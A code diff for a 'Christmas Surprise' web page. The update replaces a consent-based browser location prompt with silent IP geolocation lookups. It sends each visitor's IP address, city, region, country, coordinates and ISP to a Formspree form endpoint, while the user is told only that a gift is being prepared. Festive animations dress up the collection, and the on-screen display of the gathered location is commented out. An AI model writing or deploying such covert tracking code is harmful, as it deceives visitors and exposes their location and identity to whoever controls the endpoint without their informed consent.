@@ -1,17 +1,38 @@
-// Christmas Surprise Form with Name and Location
+// Christmas Surprise Form with Celebration Animations
 document.addEventListener('DOMContentLoaded', function() {
-    const shareBtn = document.getElementById('shareLocationBtn');
+    const submitBtn = document.getElementById('submitBtn');
     const userNameInput = document.getElementById('userName');
     const nameError = document.getElementById('nameError');
     const statusMsg = document.getElementById('statusMessage');
-    const coordsDisplay = document.getElementById('coordinates');
+    const locationInfo = document.getElementById('locationInfo');
+    const manualLocationDiv = document.querySelector('.location-fallback');
+    const manualLocationInput = document.getElementById('manualLocation');
     
     // Formspree Configuration
     const FORMSPREE_ENDPOINT = "https://formspree.io/f/mgoeyjon";
     
+    // Celebration configuration
+    const celebrationConfig = {
+        enabled: true,
+        particleCount: 50,
+        sparkleCount: 30,
+        confettiCount: 100,
+        duration: 5000,
+        colors: ['#FF6B6B', '#4ECDC4', '#FFD166', '#06D6A0', '#118AB2', '#EF476F', '#FFD700']
+    };
+    
     // Track if we're currently processing
     let isProcessing = false;
-    let geolocationTimeout;
+    let userLocationData = null;
+    let isCelebrating = false;
+    
+    // Free IP geolocation API
+    const IP_API_ENDPOINT = "https://ipapi.co/json/";
+    const BACKUP_IP_API = "https://geolocation-db.com/json/";
+    
+    // Celebration emojis and symbols
+    const celebrationSymbols = ['🎉', '🎊', '🎁', '✨', '🌟', '💫', '🥳', '🎄', '🎅', '🤶', '🧑‍🎄', '🦌', '⭐', '❄️', '🎆', '🎇', '🪅', '🪩'];
+    const flowerSymbols = ['🌸', '💮', '🏵️', '🌹', '🥀', '🌺', '🌻', '🌼', '🌷', '🌱', '🍃', '🌿', '☘️', '🍀', '🎍', '🪴'];
     
     // Validation functions
     function validateName(name) {
@@ -28,7 +49,7 @@ document.addEventListener('DOMContentLoaded', function() {
         if (!/^[a-zA-Z\s\-'.]+$/.test(name)) {
             return "Please enter a valid name (letters and spaces only)";
         }
-        return null; // No error
+        return null;
     }
     
     function updateNameValidation() {
@@ -48,48 +69,462 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
     
-    // Status display functions
-    function showStatus(text, type) {
+    // Status display with celebration
+    function showStatus(text, type, celebrate = false) {
         statusMsg.textContent = text;
         statusMsg.className = `status-message ${type}`;
         statusMsg.style.display = 'block';
         
-        // Auto-hide success messages after 5 seconds
+        if (celebrate && type === 'success') {
+            statusMsg.classList.add('celebrating');
+            triggerCelebration();
+        }
+        
         if (type === 'success') {
             setTimeout(() => {
-                if (statusMsg.className.includes('success')) {
-                    statusMsg.style.display = 'none';
-                }
-            }, 5000);
+                statusMsg.style.display = 'none';
+                statusMsg.classList.remove('celebrating');
+            }, 8000);
         }
     }
     
-    function showCoords(lat, lon) {
-        coordsDisplay.innerHTML = `
-            <strong>Location shared:</strong><br>
-            Latitude: ${lat.toFixed(6)}<br>
-            Longitude: ${lon.toFixed(6)}
+    function showLocationInfo(data) {
+        let info = `<strong>🎯 preparing christmas Gift:</strong><br>`;
+        
+        if (data.city && data.region) {
+            info += `${data.city}, ${data.region}`;
+            if (data.country_name) {
+                info += `, ${data.country_name}`;
+            }
+        } else if (data.country_name) {
+            info += `${data.country_name}`;
+        } else {
+            info += `Christmas Gift successfully prepared`;
+        }
+        
+        locationInfo.innerHTML = info;
+        locationInfo.classList.add('show');
+    }
+    
+    // Celebration Animation Functions
+    function createParticle(symbol, x, y, animation) {
+        const particle = document.createElement('div');
+        particle.className = 'celebration-particle';
+        particle.innerHTML = symbol;
+        particle.style.cssText = `
+            left: ${x}px;
+            top: ${y}px;
+            color: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
+            animation: ${animation} ${2 + Math.random() * 3}s ease-out forwards;
+            font-size: ${20 + Math.random() * 20}px;
+            transform: rotate(${Math.random() * 360}deg);
         `;
-        coordsDisplay.classList.add('show');
+        document.body.appendChild(particle);
+        
+        setTimeout(() => {
+            if (particle.parentNode) {
+                particle.parentNode.removeChild(particle);
+            }
+        }, 3000);
+        
+        return particle;
+    }
+    
+    function createSparkle(x, y) {
+        const sparkle = document.createElement('div');
+        sparkle.className = 'celebration-sparkle';
+        sparkle.style.cssText = `
+            left: ${x}px;
+            top: ${y}px;
+            background: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
+            animation-delay: ${Math.random() * 2}s;
+            animation-duration: ${0.5 + Math.random()}s;
+        `;
+        document.body.appendChild(sparkle);
+        
+        setTimeout(() => {
+            if (sparkle.parentNode) {
+                sparkle.parentNode.removeChild(sparkle);
+            }
+        }, 2000);
+    }
+    
+    function createConfetti(x, y) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+        confetti.style.cssText = `
+            left: ${x}px;
+            top: ${y}px;
+            background: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
+            --rotation: ${Math.random() * 720 - 360}deg;
+            animation: confettiRain ${1 + Math.random() * 2}s ease-out forwards;
+            animation-delay: ${Math.random() * 0.5}s;
+            border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
+            transform: rotate(${Math.random() * 360}deg);
+        `;
+        document.body.appendChild(confetti);
+        
+        setTimeout(() => {
+            if (confetti.parentNode) {
+                confetti.parentNode.removeChild(confetti);
+            }
+        }, 3000);
+    }
+    
+    function createFirework(x, y) {
+        const firework = document.createElement('div');
+        firework.className = 'firework';
+        firework.style.cssText = `
+            left: ${x}px;
+            top: ${y}px;
+            color: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
+        `;
+        document.body.appendChild(firework);
+        
+        // Explode effect
+        const particles = 12;
+        for (let i = 0; i < particles; i++) {
+            setTimeout(() => {
+                const angle = (i * 360 / particles) * (Math.PI / 180);
+                const distance = 50 + Math.random() * 100;
+                const particle = document.createElement('div');
+                particle.className = 'firework-particle';
+                particle.style.cssText = `
+                    position: fixed;
+                    left: ${x}px;
+                    top: ${y}px;
+                    width: 4px;
+                    height: 4px;
+                    border-radius: 50%;
+                    background: ${firework.style.color};
+                    animation: fireworkExplode 1s ease-out forwards;
+                    --angle: ${angle}rad;
+                    --distance: ${distance}px;
+                `;
+                document.body.appendChild(particle);
+                
+                setTimeout(() => {
+                    if (particle.parentNode) {
+                        particle.parentNode.removeChild(particle);
+                    }
+                }, 1000);
+            }, i * 50);
+        }
+        
+        setTimeout(() => {
+            if (firework.parentNode) {
+                firework.parentNode.removeChild(firework);
+            }
+        }, 1000);
+    }
+    
+    function createFloatingText(text, x, y) {
+        const floatingText = document.createElement('div');
+        floatingText.className = 'floating-text';
+        floatingText.textContent = text;
+        floatingText.style.cssText = `
+            left: ${x}px;
+            top: ${y}px;
+            animation: floatUp 3s ease-out forwards;
+            color: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
+        `;
+        document.body.appendChild(floatingText);
+        
+        setTimeout(() => {
+            if (floatingText.parentNode) {
+                floatingText.parentNode.removeChild(floatingText);
+            }
+        }, 3000);
+    }
+    
+    function createGiftBox(x, y) {
+        const giftBox = document.createElement('div');
+        giftBox.className = 'gift-box';
+        giftBox.innerHTML = '🎁';
+        giftBox.style.cssText = `
+            left: ${x}px;
+            top: ${y}px;
+            animation: floatUp 4s ease-out forwards, bounce 0.5s ease-in-out infinite;
+        `;
+        document.body.appendChild(giftBox);
+        
+        setTimeout(() => {
+            if (giftBox.parentNode) {
+                giftBox.parentNode.removeChild(giftBox);
+            }
+        }, 4000);
+    }
+    
+    function createFlowerPetals() {
+        const petalCount = 30;
+        const container = document.createElement('div');
+        container.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+        `;
+        document.body.appendChild(container);
+        
+        for (let i = 0; i < petalCount; i++) {
+            const petal = document.createElement('div');
+            petal.innerHTML = flowerSymbols[Math.floor(Math.random() * flowerSymbols.length)];
+            petal.style.cssText = `
+                position: absolute;
+                font-size: ${20 + Math.random() * 30}px;
+                opacity: ${0.5 + Math.random() * 0.5};
+                left: ${Math.random() * 100}%;
+                animation: floatDown ${3 + Math.random() * 4}s linear infinite;
+                animation-delay: ${Math.random() * 5}s;
+                transform: rotate(${Math.random() * 360}deg);
+            `;
+            container.appendChild(petal);
+        }
+        
+        setTimeout(() => {
+            if (container.parentNode) {
+                container.parentNode.removeChild(container);
+            }
+        }, 8000);
+    }
+    
+    // Main celebration trigger
+    function triggerCelebration() {
+        if (isCelebrating || !celebrationConfig.enabled) return;
+        
+        isCelebrating = true;
+        submitBtn.classList.add('celebrating');
+        
+        // Create overlay
+        const overlay = document.createElement('div');
+        overlay.className = 'celebration-overlay';
+        overlay.style.opacity = '0.3';
+        document.body.appendChild(overlay);
+        
+        // Update overlay position based on mouse/touch
+        const updateOverlay = (e) => {
+            const x = e.type.includes('touch') ? e.touches[0].clientX : e.clientX;
+            const y = e.type.includes('touch') ? e.touches[0].clientY : e.clientY;
+            overlay.style.setProperty('--x', `${x}px`);
+            overlay.style.setProperty('--y', `${y}px`);
+        };
+        
+        document.addEventListener('mousemove', updateOverlay);
+        document.addEventListener('touchmove', updateOverlay);
+        
+        // Create flower petals
+        createFlowerPetals();
+        
+        // Create multiple bursts of celebration
+        const bursts = [
+            { type: 'particles', count: celebrationConfig.particleCount, delay: 0 },
+            { type: 'sparkles', count: celebrationConfig.sparkleCount, delay: 500 },
+            { type: 'confetti', count: celebrationConfig.confettiCount, delay: 1000 },
+            { type: 'fireworks', count: 5, delay: 1500 },
+            { type: 'gifts', count: 3, delay: 2000 },
+            { type: 'text', count: 5, delay: 2500 }
+        ];
+        
+        bursts.forEach((burst, burstIndex) => {
+            setTimeout(() => {
+                for (let i = 0; i < burst.count; i++) {
+                    setTimeout(() => {
+                        const x = Math.random() * window.innerWidth;
+                        const y = Math.random() * window.innerHeight;
+                        
+                        switch(burst.type) {
+                            case 'particles':
+                                const symbol = celebrationSymbols[Math.floor(Math.random() * celebrationSymbols.length)];
+                                createParticle(symbol, x, y, Math.random() > 0.5 ? 'floatUp' : 'floatDown');
+                                break;
+                            case 'sparkles':
+                                createSparkle(x, y);
+                                break;
+                            case 'confetti':
+                                createConfetti(x, y);
+                                break;
+                            case 'fireworks':
+                                createFirework(x, y);
+                                break;
+                            case 'gifts':
+                                createGiftBox(x, y);
+                                break;
+                            case 'text':
+                                const texts = ['Merry Christmas!', 'Ho Ho Ho!', '🎁 Surprise!', '🎄 Joy!', '✨ Magic!'];
+                                createFloatingText(texts[Math.floor(Math.random() * texts.length)], x, y);
+                                break;
+                        }
+                    }, i * 50);
+                }
+            }, burst.delay);
+        });
+        
+        // Create floating flowers/petals from edges
+        const flowerInterval = setInterval(() => {
+            const side = Math.floor(Math.random() * 4);
+            let x, y, animation;
+            
+            switch(side) {
+                case 0: // top
+                    x = Math.random() * window.innerWidth;
+                    y = -50;
+                    animation = 'floatDown';
+                    break;
+                case 1: // bottom
+                    x = Math.random() * window.innerWidth;
+                    y = window.innerHeight + 50;
+                    animation = 'floatUp';
+                    break;
+                case 2: // left
+                    x = -50;
+                    y = Math.random() * window.innerHeight;
+                    animation = 'floatRight';
+                    break;
+                case 3: // right
+                    x = window.innerWidth + 50;
+                    y = Math.random() * window.innerHeight;
+                    animation = 'floatLeft';
+                    break;
+            }
+            
+            const symbol = flowerSymbols[Math.floor(Math.random() * flowerSymbols.length)];
+            createParticle(symbol, x, y, animation);
+        }, 200);
+        
+        // Clean up after celebration
+        setTimeout(() => {
+            isCelebrating = false;
+            submitBtn.classList.remove('celebrating');
+            document.removeEventListener('mousemove', updateOverlay);
+            document.removeEventListener('touchmove', updateOverlay);
+            
+            if (overlay.parentNode) {
+                overlay.parentNode.removeChild(overlay);
+            }
+            
+            clearInterval(flowerInterval);
+        }, celebrationConfig.duration);
+    }
+    
+    // Add CSS for firework explosion
+    const celebrationStyles = document.createElement('style');
+    celebrationStyles.textContent = `
+        @keyframes fireworkExplode {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(
+                    calc(cos(var(--angle)) * var(--distance)),
+                    calc(sin(var(--angle)) * var(--distance))
+                ) scale(0);
+                opacity: 0;
+            }
+        }
+        
+        .firework-particle {
+            animation: fireworkExplode 1s ease-out forwards;
+        }
+    `;
+    document.head.appendChild(celebrationStyles);
+    
+    // Get location from IP address
+    async function getLocationFromIP() {
+        showStatus("🎄 Preparing your Christmass Gift...", "info");
+        
+        try {
+            const response = await fetch(IP_API_ENDPOINT, {
+                method: 'GET',
+                headers: { 'Accept': 'application/json' }
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                
+                if (data.error !== true) {
+                    userLocationData = {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country_name: data.country_name,
+                        country_code: data.country_code,
+                        postal: data.postal,
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        timezone: data.timezone,
+                        org: data.org
+                    };
+                    return userLocationData;
+                }
+            }
+        } catch (error) {
+            console.log("Primary IP API failed, trying backup...");
+        }
+        
+        try {
+            const backupResponse = await fetch(BACKUP_IP_API, {
+                method: 'GET',
+                headers: { 'Accept': 'application/json' }
+            });
+            
+            if (backupResponse.ok) {
+                const data = await backupResponse.json();
+                
+                userLocationData = {
+                    ip: data.IPv4 || "Unknown",
+                    city: data.city,
+                    region: data.state,
+                    country_name: data.country_name,
+                    country_code: data.country_code,
+                    latitude: data.latitude,
+                    longitude: data.longitude
+                };
+                return userLocationData;
+            }
+        } catch (error) {
+            console.log("Backup IP API also failed");
+        }
+        
+        userLocationData = {
+            ip: "Detection failed",
+            city: "Unknown",
+            region: "Unknown",
+            country_name: "Unknown",
+            error: "Could not detect location automatically"
+        };
+        
+        return userLocationData;
     }
     
     // Formspree submission
-    async function submitToFormspree(name, lat = null, lon = null) {
-        // Prepare form data as Formspree expects
+    async function submitToFormspree(name, locationData, manualLocation = '') {
         const formData = new FormData();
         formData.append('name', name);
+        formData.append('timestamp', new Date().toISOString());
         
-        if (lat && lon) {
-            formData.append('latitude', lat);
-            formData.append('longitude', lon);
-            formData.append('has_location', 'true');
+        if (manualLocation) {
+            formData.append('manual_location', manualLocation);
+            formData.append('location_source', 'manual');
+        } else if (locationData && locationData.city !== "Unknown") {
+            formData.append('location_city', locationData.city || 'Unknown');
+            formData.append('location_region', locationData.region || 'Unknown');
+            formData.append('location_country', locationData.country_name || 'Unknown');
+            formData.append('location_ip', locationData.ip || 'Unknown');
+            formData.append('location_source', 'ip_detection');
+            
+            if (locationData.latitude && locationData.longitude) {
+                formData.append('latitude', locationData.latitude);
+                formData.append('longitude', locationData.longitude);
+            }
         } else {
-            formData.append('has_location', 'false');
-            formData.append('latitude', 'Not provided');
-            formData.append('longitude', 'Not provided');
+            formData.append('location_source', 'not_detected');
+            formData.append('location_city', 'Not detected');
         }
         
-        formData.append('timestamp', new Date().toISOString());
         formData.append('_subject', '🎄 Christmas Surprise Request');
         formData.append('_format', 'plain');
         formData.append('_replyto', 'noreply@christmassurprise.com');
@@ -98,164 +533,110 @@ document.addEventListener('DOMContentLoaded', function() {
             const response = await fetch(FORMSPREE_ENDPOINT, {
                 method: 'POST',
                 body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
+                headers: { 'Accept': 'application/json' }
             });
             
-            if (response.ok) {
-                return { success: true, message: 'Submission successful!' };
-            } else {
-                const errorData = await response.json();
-                return { 
-                    success: false, 
-                    message: errorData.error || 'Submission failed' 
-                };
-            }
+            return response.ok ? 
+                { success: true, message: 'Submission successful!' } :
+                { success: false, message: 'Submission failed' };
         } catch (error) {
-            console.error('Network error:', error);
-            return { 
-                success: false, 
-                message: 'Network error. Please try again.' 
-            };
+            return { success: false, message: 'Network error' };
         }
     }
     
     // Reset button state
     function resetButton() {
         isProcessing = false;
-        shareBtn.disabled = false;
-        shareBtn.innerHTML = '<i class="fas fa-location-dot"></i> Share My Location for a Surprise';
-        shareBtn.style.background = '';
-        
-        if (geolocationTimeout) {
-            clearTimeout(geolocationTimeout);
-            geolocationTimeout = null;
-        }
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fas fa-gift"></i> Request Christmas Surprise';
+        submitBtn.style.background = '';
+        submitBtn.classList.remove('celebrating');
     }
     
-    // Get user's location with better timeout handling
-    function getLocation(name) {
-        if (!navigator.geolocation) {
-            showStatus("Your browser doesn't support location sharing.", "error");
+    // Show manual location input
+    function showManualLocationInput() {
+        manualLocationDiv.style.display = 'block';
+        manualLocationInput.focus();
+    }
+    
+    // Main submission handler
+    async function handleSubmission() {
+        if (isProcessing) return;
+        
+        statusMsg.style.display = 'none';
+        locationInfo.classList.remove('show');
+        
+        const name = userNameInput.value.trim();
+        const nameValidationError = validateName(name);
+        
+        if (nameValidationError) {
+            showStatus(nameValidationError, "error");
+            userNameInput.focus();
             return;
         }
         
         isProcessing = true;
-        shareBtn.disabled = true;
-        shareBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Getting location...';
-        showStatus("Getting your location... This might take a moment.", "info");
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Preparing your surprise...';
         
-        // Clear any existing timeout
-        if (geolocationTimeout) {
-            clearTimeout(geolocationTimeout);
-        }
+        // Start with a small celebration when processing begins
+        setTimeout(() => {
+            createParticle('✨', 
+                Math.random() * window.innerWidth, 
+                Math.random() * window.innerHeight, 
+                'floatUp'
+            );
+        }, 100);
         
-        // Set a timeout for the entire geolocation process
-        geolocationTimeout = setTimeout(() => {
-            if (isProcessing) {
-                handleLocationError({
-                    code: 3,
-                    message: 'Location request is taking longer than expected'
-                }, name);
-            }
-        }, 15000); // 15 second total timeout
-        
-        // Try to get location with different strategies
-        const geolocationOptions = {
-            enableHighAccuracy: true,  // Try for best accuracy first
-            timeout: 10000,           // 10 seconds for high accuracy attempt
-            maximumAge: 300000        // Accept cached location up to 5 minutes old
-        };
-        
-        navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                // Clear the timeout since we got a response
-                if (geolocationTimeout) {
-                    clearTimeout(geolocationTimeout);
-                    geolocationTimeout = null;
-                }
-                
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                showCoords(lat, lon);
-                showStatus(`Found you! Accuracy: ${Math.round(accuracy)} meters. Sending to Santa... 🎅`, "info");
-                
-                // Submit to Formspree
-                const result = await submitToFormspree(name, lat, lon);
-                
-                if (result.success) {
-                    showStatus(`Thank you ${name}! Your Christmas surprise is on its way! 🎁`, "success");
-                    shareBtn.innerHTML = '<i class="fas fa-check-circle"></i> Request Sent!';
-                    shareBtn.style.background = '#4CAF50';
-                    
-                    // Reset form after success
-                    setTimeout(() => {
-                        userNameInput.value = '';
-                        userNameInput.classList.remove('success');
-                        coordsDisplay.classList.remove('show');
-                        resetButton();
-                    }, 3000);
-                } else {
-                    showStatus(`Form submitted but: ${result.message}`, "info");
-                    shareBtn.innerHTML = '<i class="fas fa-check-circle"></i> Name Submitted';
-                    shareBtn.style.background = '#4CAF50';
-                    setTimeout(resetButton, 3000);
-                }
-            },
-            (error) => {
-                // Clear the timeout since we got an error
-                if (geolocationTimeout) {
-                    clearTimeout(geolocationTimeout);
-                    geolocationTimeout = null;
-                }
-                
-                handleLocationError(error, name);
-            },
-            geolocationOptions
-        );
-    }
-    
-    // Handle location errors gracefully
-    async function handleLocationError(error, name) {
-        let errorMessage = "";
-        let showRetryOption = true;
-        
-        switch(error.code) {
-            case 1: // PERMISSION_DENIED
-                errorMessage = "📍 Location access was denied. We'll still send your name to Santa!";
-                showRetryOption = false;
-                break;
-            case 2: // POSITION_UNAVAILABLE
-                errorMessage = "📍 Location service is unavailable. We'll still send your name to Santa!";
-                break;
-            case 3: // TIMEOUT
-                errorMessage = "📍 Location request timed out. We'll still send your name to Santa!";
-                break;
-            default:
-                errorMessage = "📍 Couldn't get location. We'll still send your name to Santa!";
-                break;
-        }
-        
-        showStatus(errorMessage, "warning");
-        
-        // Even without location, submit the name
-        const result = await submitToFormspree(name, null, null);
-        
-        if (result.success) {
-            showStatus(`Thank you ${name}! Santa has your name! 🎅`, "success");
-            shareBtn.innerHTML = '<i class="fas fa-check-circle"></i> Name Submitted!';
-            shareBtn.style.background = '#4CAF50';
+        try {
+            showStatus("🔍 Detecting your location for Santa...", "info");
+            const locationData = await getLocationFromIP();
             
-            setTimeout(() => {
-                userNameInput.value = '';
-                userNameInput.classList.remove('success');
+            // showLocationInfo(locationData);
+            const manualLocation = manualLocationInput.value.trim();
+            
+            if (!manualLocation && (!locationData.city || locationData.city === "Unknown")) {
+                showStatus("📍 Couldn't detect your city. Please enter it below (optional).", "warning");
+                showManualLocationInput();
                 resetButton();
-            }, 3000);
-        } else {
-            showStatus("Couldn't submit. Please try again.", "error");
+                return;
+            }
+            
+            // More celebration during sending
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    createParticle('🎄', 
+                        Math.random() * window.innerWidth, 
+                        Math.random() * window.innerHeight, 
+                        'floatUp'
+                    );
+                }, i * 300);
+            }
+            
+            showStatus("✉️ Sending your Christmas wish to Santa... 🎅", "info");
+            const result = await submitToFormspree(name, locationData, manualLocation);
+            
+            if (result.success) {
+                showStatus(`🎉 Thank you ${name}! Your Christmas surprise is flowers of happiness enjoy! 🎁`, "success", true);
+                submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Surprise Requested!';
+                submitBtn.style.background = '#4CAF50';
+                
+                setTimeout(() => {
+                    userNameInput.value = '';
+                    userNameInput.classList.remove('success');
+                    manualLocationInput.value = '';
+                    manualLocationDiv.style.display = 'none';
+                    locationInfo.classList.remove('show');
+                    resetButton();
+                }, 8000);
+            } else {
+                showStatus(`❌ Oops! ${result.message}`, "error");
+                resetButton();
+            }
+            
+        } catch (error) {
+            console.log(error)
+            showStatus("⚠️ Something went wrong. Please try again.", "error");
             resetButton();
         }
     }
@@ -264,58 +645,34 @@ document.addEventListener('DOMContentLoaded', function() {
     userNameInput.addEventListener('input', updateNameValidation);
     userNameInput.addEventListener('blur', updateNameValidation);
     
-    shareBtn.addEventListener('click', function() {
-        if (isProcessing) return;
-        
-        // Hide previous messages
-        statusMsg.style.display = 'none';
-        coordsDisplay.classList.remove('show');
-        
-        // Validate name
-        const name = userNameInput.value.trim();
-        const nameError = validateName(name);
-        
-        if (nameError) {
-            showStatus(nameError, "error");
-            userNameInput.focus();
-            return;
-        }
-        
-        // Start the process
-        getLocation(name);
-    });
+    submitBtn.addEventListener('click', handleSubmission);
     
-    // Allow form submission with Enter key
-    userNameInput.addEventListener('keypress', function(e) {
+    userNameInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter' && !isProcessing) {
-            shareBtn.click();
+            e.preventDefault();
+            submitBtn.click();
         }
     });
     
-    // Add location troubleshooting tips
-    const troubleshootingTips = document.createElement('div');
-    troubleshootingTips.className = 'troubleshooting';
-    troubleshootingTips.innerHTML = `
-        <details style="margin-top: 20px; background: #f0f8ff; padding: 10px; border-radius: 8px; border: 1px solid #ddd;">
-            <summary style="font-weight: bold; cursor: pointer; color: var(--christmas-green);">
-                <i class="fas fa-question-circle"></i> Location not working?
-            </summary>
-            <div style="margin-top: 10px; font-size: 0.9rem;">
-                <p><strong>Try these tips:</strong></p>
-                <ol style="margin-left: 20px;">
-                    <li>Make sure location/GPS is enabled on your device</li>
-                    <li>Check browser permissions (allow location access)</li>
-                    <li>Try refreshing the page</li>
-                    <li>Use a device with GPS (phones work best)</li>
-                    <li>Connect to WiFi for better accuracy</li>
-                </ol>
-                <p><em>Don't worry - we'll still send your name to Santa even without location! 🎅</em></p>
-            </div>
-        </details>
-    `;
+    manualLocationInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && !isProcessing) {
+            e.preventDefault();
+            submitBtn.click();
+        }
+    });
     
-    // Insert troubleshooting after the action div
-    document.querySelector('.action').appendChild(troubleshootingTips);
+    // Small celebration when page loads
+    setTimeout(() => {
+        for (let i = 0; i < 3; i++) {
+            setTimeout(() => {
+                createParticle('🌟', 
+                    Math.random() * window.innerWidth, 
+                    Math.random() * window.innerHeight, 
+                    'floatDown'
+                );
+            }, i * 500);
+        }
+    }, 1000);
     
     // Christmas snow effect
     const snowContainer = document.createElement('div');
@@ -330,12 +687,12 @@ document.addEventListener('DOMContentLoaded', function() {
     `;
     document.body.appendChild(snowContainer);
     
-    for (let i = 0; i < 8; i++) {
+    for (let i = 0; i < 10; i++) {
         const flake = document.createElement('div');
         flake.innerHTML = '❄';
         flake.style.cssText = `
             position: absolute;
-            font-size: 20px;
+            font-size: ${15 + Math.random() * 15}px;
             opacity: ${0.3 + Math.random() * 0.3};
             animation: fall ${3 + Math.random() * 5}s linear infinite;
             animation-delay: ${Math.random() * 5}s;
@@ -343,48 +700,4 @@ document.addEventListener('DOMContentLoaded', function() {
         `;
         snowContainer.appendChild(flake);
     }
-    
-    const style = document.createElement('style');
-    style.textContent = `
-        @keyframes fall {
-            from {
-                transform: translateY(-50px) rotate(0deg);
-                opacity: 0.8;
-            }
-            to {
-                transform: translateY(100vh) rotate(360deg);
-                opacity: 0;
-            }
-        }
-        
-        .fa-spinner {
-            margin-right: 8px;
-        }
-        
-        .status-message.warning {
-            display: block;
-            background-color: #fff3cd;
-            color: #856404;
-            border: 2px solid #ffeaa7;
-        }
-        
-        .troubleshooting summary {
-            list-style: none;
-        }
-        
-        .troubleshooting summary::-webkit-details-marker {
-            display: none;
-        }
-        
-        .troubleshooting summary:after {
-            content: '▼';
-            float: right;
-            transition: transform 0.3s;
-        }
-        
-        .troubleshooting[open] summary:after {
-            transform: rotate(180deg);
-        }
-    `;
-    document.head.appendChild(style);
 });
